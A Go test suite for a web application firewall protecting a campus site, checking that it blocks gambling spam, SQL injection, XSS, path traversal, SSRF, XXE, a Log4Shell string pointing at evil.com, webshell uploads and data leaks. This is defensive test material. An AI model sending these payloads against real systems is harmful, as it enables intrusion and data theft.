package waf

import (
	"bytes"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/theboynewbie/athena-shield/internal/config"
	"github.com/theboynewbie/athena-shield/internal/ratelimit"
	"github.com/theboynewbie/athena-shield/internal/store"
)

func setupTestEngine(t *testing.T) (*Engine, *store.Store, *ratelimit.RateLimiter) {
	t.Helper()
	dir := t.TempDir()
	s, err := store.Open(dir, "admin", "admin@test.local", "GuardianWAF@2026")
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(func() { s.Close() })

	cfg := config.Load()
	cfg.AutoBanThreshold = 5
	rl := ratelimit.New(cfg, s, nil)
	eng := NewEngine(cfg, s, rl)
	return eng, s, rl
}

func makeReq(method, target string, ua string, body []byte, contentType string) *http.Request {
	req := httptest.NewRequest(method, target, bytes.NewReader(body))
	req.RemoteAddr = "203.0.113.50:12345"
	if ua != "" {
		req.Header.Set("User-Agent", ua)
	} else {
		req.Header.Set("User-Agent", "Mozilla/5.0")
	}
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	return req
}

func TestDetectionsAndNormalization(t *testing.T) {
	eng, _, _ := setupTestEngine(t)
	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", RateLimitEnabled: true, AppProfile: "universal", BlockBadBots: true, IsActive: true}

	cases := []struct {
		name      string
		method    string
		target    string
		ua        string
		body      string
		wantBlock bool
	}{
		{"Clean home", "GET", "http://kampus.ac.id/", "", "", false},
		{"Judi slot plain", "GET", "http://kampus.ac.id/?s=slot+gacor+hari+ini", "", "", true},
		{"Judi slot leetspeak", "GET", "http://kampus.ac.id/?s=sl0t+g4c0r+m4xw1n", "", "", true},
		{"Judi slot zero-width", "GET", "http://kampus.ac.id/?s=s\u200blot+gacor", "", "", true},
		{"Judi slot homoglyph", "GET", "http://kampus.ac.id/?s=ѕlot+gаcor", "", "", true},
		{"SQLi union select", "GET", "http://kampus.ac.id/?id=1+UNION+SELECT+1,2,3", "", "", true},
		{"XSS script tag", "POST", "http://kampus.ac.id/comment", "", "<script>alert(1)</script>", true},
		{"Path traversal", "GET", "http://kampus.ac.id/../../etc/passwd", "", "", true},
		{"Sensitive .env", "GET", "http://kampus.ac.id/.env", "", "", true},
		{"Log4Shell", "GET", "http://kampus.ac.id/", "${jndi:ldap://evil.com/a}", "", true},
		{"Bad bot ClaudeBot", "GET", "http://kampus.ac.id/", "ClaudeBot/1.0", "", true},
		{"Good bot Googlebot", "GET", "http://kampus.ac.id/", "Mozilla/5.0 (compatible; Googlebot/2.1)", "", false},
		{"WP Admin Mine tab exempt", "GET", "http://kampus.ac.id/wp-admin/edit.php?post_type=post&author=1", "", "", false},
		{"Public author enum blocked", "GET", "http://kampus.ac.id/?author=1", "", "", true},
		{"OPAC author search exempt", "GET", "http://kampus.ac.id/?keywords=buku&author=1", "", "", false},
		{"Cloud metadata SSRF blocked", "GET", "http://kampus.ac.id/?url=http://169.254.169.254/latest/meta-data/", "", "", true},
		{"XXE external entity blocked", "POST", "http://kampus.ac.id/api/xml", "", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := makeReq(tc.method, tc.target, tc.ua, []byte(tc.body), "application/x-www-form-urlencoded")
			dec := eng.Inspect(req, host, []byte(tc.body))
			if dec.Blocked != tc.wantBlock {
				t.Fatalf("got Blocked=%v (reason=%q), want %v", dec.Blocked, dec.Reason, tc.wantBlock)
			}
		})
	}
}

func TestModesBypassAndMonitor(t *testing.T) {
	eng, _, _ := setupTestEngine(t)
	req := makeReq("GET", "http://kampus.ac.id/?q=slot+gacor", "", nil, "")

	bypassHost := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: false, WAFMode: "bypass", IsActive: true}
	dec := eng.Inspect(req, bypassHost, nil)
	if dec.Blocked || dec.Mode != "bypass" {
		t.Fatalf("expected bypass, got %+v", dec)
	}

	monHost := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "monitor", RateLimitEnabled: false, IsActive: true}
	dec = eng.Inspect(req, monHost, nil)
	if !dec.Blocked || dec.Mode != "monitor" {
		t.Fatalf("expected monitor detection, got %+v", dec)
	}
}

func TestIPListsCIDRAndMultipartUpload(t *testing.T) {
	eng, s, _ := setupTestEngine(t)
	if err := s.AddIP(&store.IPList{IPAddress: "198.51.100.0/24", ListType: "WHITELIST", Reason: "trusted"}); err != nil {
		t.Fatal(err)
	}
	if err := s.AddIP(&store.IPList{IPAddress: "192.0.2.10", ListType: "BLACKLIST", Reason: "banned"}); err != nil {
		t.Fatal(err)
	}
	eng.Reload()

	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", IsActive: true}

	// Whitelisted CIDR passes even with SQLi
	reqWhite := makeReq("GET", "http://kampus.ac.id/?id=1+UNION+SELECT+1", "", nil, "")
	reqWhite.RemoteAddr = "198.51.100.42:1234"
	if dec := eng.Inspect(reqWhite, host, nil); dec.Blocked {
		t.Fatalf("expected whitelisted CIDR to pass, got %+v", dec)
	}

	// Blacklisted IP blocked
	reqBlack := makeReq("GET", "http://kampus.ac.id/", "", nil, "")
	reqBlack.RemoteAddr = "192.0.2.10:1234"
	if dec := eng.Inspect(reqBlack, host, nil); !dec.Blocked {
		t.Fatalf("expected blacklisted IP to be blocked")
	}

	// Multipart webshell double extension blocked
	mpBody := []byte("--abc\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php.png\"\r\nContent-Type: image/png\r\n\r\n<?php echo 1; ?>\r\n--abc--\r\n")
	reqUp := makeReq("POST", "http://kampus.ac.id/upload", "", mpBody, "multipart/form-data; boundary=abc")
	if dec := eng.Inspect(reqUp, host, mpBody); !dec.Blocked {
		t.Fatalf("expected double-extension webshell upload to be blocked")
	}
}

func TestAnomalyScoringParanoiaAndDryRun(t *testing.T) {
	eng, s, _ := setupTestEngine(t)
	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", AppProfile: "universal", IsActive: true}

	// Add two score-3 rules at PL2 and one MONITOR rule at PL1
	if err := s.CreateRule(&store.Rule{
		Name: "Anomaly Part A", Pattern: `alpha_probe`, Category: "custom", Action: "BLOCK", Severity: "WARNING", Score: 3, ParanoiaLevel: 2, IsActive: true,
	}); err != nil {
		t.Fatal(err)
	}
	if err := s.CreateRule(&store.Rule{
		Name: "Anomaly Part B", Pattern: `beta_probe`, Category: "custom", Action: "BLOCK", Severity: "WARNING", Score: 3, ParanoiaLevel: 2, IsActive: true,
	}); err != nil {
		t.Fatal(err)
	}
	if err := s.CreateRule(&store.Rule{
		Name: "Shadow DryRun Rule", Pattern: `shadow_test_token`, Category: "custom", Action: "MONITOR", Severity: "CRITICAL", Score: 5, ParanoiaLevel: 1, IsActive: true,
	}); err != nil {
		t.Fatal(err)
	}
	eng.Reload()

	// 1. At PL1, PL2 rules must NOT fire
	reqPL2 := makeReq("GET", "http://kampus.ac.id/?a=alpha_probe&b=beta_probe", "", nil, "")
	if dec := eng.Inspect(reqPL2, host, nil); dec.Blocked {
		t.Fatalf("expected PL2 rules to be skipped at PL1, got %+v", dec)
	}

	// 2. Shadow rule in MONITOR mode must not block, but must populate ShadowMatches
	reqShadow := makeReq("GET", "http://kampus.ac.id/?q=shadow_test_token", "", nil, "")
	decShadow := eng.Inspect(reqShadow, host, nil)
	if decShadow.Blocked || len(decShadow.ShadowMatches) == 0 {
		t.Fatalf("expected shadow match without block, got %+v", decShadow)
	}

	// 3. Raise Paranoia Level to 2
	if err := s.UpdateSettings(map[string]string{"waf_paranoia_level": "2", "waf_anomaly_threshold": "5"}); err != nil {
		t.Fatal(err)
	}
	eng.Reload()

	// Single score-3 match < threshold 5 -> should NOT block
	reqSingle := makeReq("GET", "http://kampus.ac.id/?a=alpha_probe", "", nil, "")
	decSingle := eng.Inspect(reqSingle, host, nil)
	if decSingle.Blocked || decSingle.AnomalyScore != 3 {
		t.Fatalf("expected score 3 allowed (<5), got %+v", decSingle)
	}

	// Combined score 3+3=6 >= threshold 5 -> MUST block
	decCombined := eng.Inspect(reqPL2, host, nil)
	if !decCombined.Blocked || decCombined.AnomalyScore != 6 {
		t.Fatalf("expected combined score 6 to block, got %+v", decCombined)
	}
}

func TestDeepParserJSONGraphQLXML(t *testing.T) {
	eng, s, _ := setupTestEngine(t)
	_ = s.UpdateSettings(map[string]string{"waf_paranoia_level": "3"})
	eng.Reload()
	host := &store.ProxyHost{DomainName: "api.kampus.ac.id", WAFEnabled: true, WAFMode: "active", AppProfile: "universal", IsActive: true}

	// Nested JSON with unicode-escaped XSS
	jsonXSS := []byte(`{"user":{"profile":{"bio":"\u003cscript\u003ealert(1)\u003c/script\u003e"}}}`)
	reqJSON := makeReq("POST", "http://api.kampus.ac.id/v1/profile", "", jsonXSS, "application/json")
	if dec := eng.Inspect(reqJSON, host, jsonXSS); !dec.Blocked {
		t.Fatalf("expected nested unicode-escaped JSON XSS to be blocked, got %+v", dec)
	}

	// Deeply nested JSON bomb (>16 levels)
	deepJSON := []byte(`{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":{"a":"boom"}}}}}}}}}}}}}}}}}`)
	reqBomb := makeReq("POST", "http://api.kampus.ac.id/v1/profile", "", deepJSON, "application/json")
	if dec := eng.Inspect(reqBomb, host, deepJSON); !dec.Blocked || dec.Category != "Protocol Hardening" {
		t.Fatalf("expected JSON nesting bomb to be blocked as Protocol Hardening, got %+v", dec)
	}

	// GraphQL introspection at PL3 scores +3 (blocks when combined or threshold <= 3)
	gqlBody := []byte(`{"query":"query { __schema { types { name } } }"}`)
	reqGQL := makeReq("POST", "http://api.kampus.ac.id/graphql", "", gqlBody, "application/json")
	decGQL := eng.Inspect(reqGQL, host, gqlBody)
	if decGQL.AnomalyScore < 3 || len(decGQL.MatchedRules) == 0 {
		t.Fatalf("expected GraphQL introspection at PL3 to score >= 3, got %+v", decGQL)
	}

	// GraphQL nesting depth bomb (> 12 braces) blocked as Protocol Hardening
	gqlBomb := []byte(`{"query":"query { a { b { c { d { e { f { g { h { i { j { k { l { m { id } } } } } } } } } } } } } }"}`)
	reqGQLBomb := makeReq("POST", "http://api.kampus.ac.id/graphql", "", gqlBomb, "application/json")
	if dec := eng.Inspect(reqGQLBomb, host, gqlBomb); !dec.Blocked || dec.Category != "Protocol Hardening" {
		t.Fatalf("expected GraphQL nesting bomb to be blocked as Protocol Hardening, got %+v", dec)
	}

	// XML attribute payload
	xmlBody := []byte(`<root><item attr="1 UNION SELECT 1,2,3">ok</item></root>`)
	reqXML := makeReq("POST", "http://api.kampus.ac.id/xml", "", xmlBody, "application/xml")
	if dec := eng.Inspect(reqXML, host, xmlBody); !dec.Blocked {
		t.Fatalf("expected XML attribute SQLi to be blocked, got %+v", dec)
	}
}

func TestResponseDLPAndDefacement(t *testing.T) {
	eng, s, _ := setupTestEngine(t)
	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", IsActive: true}

	// SQL error leak
	if dec := eng.InspectResponse(500, "text/html; charset=utf-8", []byte("Warning: You have an error in your SQL syntax near ''"), host); !dec.Blocked {
		t.Fatalf("expected SQL error leak to be blocked")
	}

	// Private key leak
	if dec := eng.InspectResponse(200, "text/plain", []byte("-----BEGIN RSA PRIVATE KEY-----\nMIIE..."), host); !dec.Blocked {
		t.Fatalf("expected private key leak to be blocked")
	}

	// Luhn-valid Visa PAN blocked vs non-Luhn 16-digit ID allowed
	if dec := eng.InspectResponse(200, "application/json", []byte(`{"card":"4111111111111111"}`), host); !dec.Blocked {
		t.Fatalf("expected Luhn-valid card PAN to be blocked")
	}
	if dec := eng.InspectResponse(200, "application/json", []byte(`{"order_id":"4111111111111112"}`), host); dec.Blocked {
		t.Fatalf("expected non-Luhn 16-digit number to pass, got %+v", dec)
	}

	// Defacement slot HTML
	if dec := eng.InspectResponse(200, "text/html", []byte("<html><body>Promo Slot Gacor Maxwin</body></html>"), host); !dec.Blocked {
		t.Fatalf("expected origin judi defacement HTML to be blocked")
	}

	// DLP monitor mode
	_ = s.UpdateSettings(map[string]string{"waf_dlp_mode": "monitor"})
	eng.Reload()
	decMon := eng.InspectResponse(500, "text/html", []byte("SQLSTATE[42000]: Syntax error"), host)
	if !decMon.Blocked || decMon.Mode != "monitor" {
		t.Fatalf("expected DLP monitor decision, got %+v", decMon)
	}
}

func TestJSChallengePoWAndClearance(t *testing.T) {
	eng, s, _ := setupTestEngine(t)
	_ = s.UpdateSettings(map[string]string{"waf_js_challenge_enabled": "true", "waf_js_challenge_difficulty": "12"})
	eng.Reload()

	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", BlockBadBots: true, IsActive: true}
	req := makeReq("GET", "http://kampus.ac.id/portal", "Mozilla/5.0", nil, "")

	// Without clearance cookie, should trigger Challenge
	dec := eng.Inspect(req, host, nil)
	if !dec.Blocked || !dec.Challenge {
		t.Fatalf("expected JS challenge for unverified GET, got %+v", dec)
	}

	// Solve PoW
	diff := eng.ChallengeDifficulty()
	nonce, exp, sig := eng.CreateChallenge("203.0.113.50", "Mozilla/5.0", diff)
	sol := ""
	for i := 0; i < 100000; i++ {
		cand := fmt.Sprintf("%d", i)
		if eng.VerifyPoW(nonce, exp, sig, cand, "203.0.113.50", "Mozilla/5.0", diff) {
			sol = cand
			break
		}
	}
	if sol == "" {
		t.Fatalf("failed to solve %d-bit PoW within 100k iterations", diff)
	}

	// Issue clearance cookie and verify access
	cookie := eng.IssueClearanceCookie("203.0.113.50", "Mozilla/5.0", true)
	req.AddCookie(cookie)
	if dec2 := eng.Inspect(req, host, nil); dec2.Blocked {
		t.Fatalf("expected request with valid clearance cookie to pass, got %+v", dec2)
	}

	// Different IP with same cookie should fail clearance
	reqOtherIP := makeReq("GET", "http://kampus.ac.id/portal", "Mozilla/5.0", nil, "")
	reqOtherIP.RemoteAddr = "203.0.113.99:4444"
	reqOtherIP.AddCookie(cookie)
	if dec3 := eng.Inspect(reqOtherIP, host, nil); !dec3.Challenge {
		t.Fatalf("expected clearance cookie bound to original IP to fail on different IP, got %+v", dec3)
	}
}

func TestBotFingerprintAndGeoIPBlock(t *testing.T) {
	eng, s, _ := setupTestEngine(t)
	host := &store.ProxyHost{DomainName: "kampus.ac.id", WAFEnabled: true, WAFMode: "active", BlockBadBots: true, IsActive: true}

	// HeadlessChrome blocked
	reqHeadless := makeReq("GET", "http://kampus.ac.id/", "Mozilla/5.0 HeadlessChrome/120.0.0.0", nil, "")
	if dec := eng.Inspect(reqHeadless, host, nil); !dec.Blocked {
		t.Fatalf("expected HeadlessChrome to be blocked")
	}

	// Modern Chrome UA over HTTP/1.0 blocked
	reqSpoof := makeReq("GET", "http://kampus.ac.id/", "Mozilla/5.0 Chrome/124.0.0.0", nil, "")
	reqSpoof.ProtoMajor = 1
	reqSpoof.ProtoMinor = 0
	if dec := eng.Inspect(reqSpoof, host, nil); !dec.Blocked {
		t.Fatalf("expected Chrome UA over HTTP/1.0 to be blocked")
	}

	// Verified Googlebot allowed
	reqGoogle := makeReq("GET", "http://kampus.ac.id/", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", nil, "")
	if dec := eng.Inspect(reqGoogle, host, nil); dec.Blocked {
		t.Fatalf("expected Googlebot to pass, got %+v", dec)
	}

	// GeoIP country block
	_ = s.UpdateSettings(map[string]string{"waf_geoip_blocked_countries": "KP,RU"})
	eng.Reload()
	reqKP := makeReq("GET", "http://kampus.ac.id/", "Mozilla/5.0", nil, "")
	reqKP.Header.Set("CF-IPCountry", "KP")
	if dec := eng.Inspect(reqKP, host, nil); !dec.Blocked || dec.Category != "GeoIP Block" {
		t.Fatalf("expected KP country to be blocked by GeoIP Shield, got %+v", dec)
	}
}
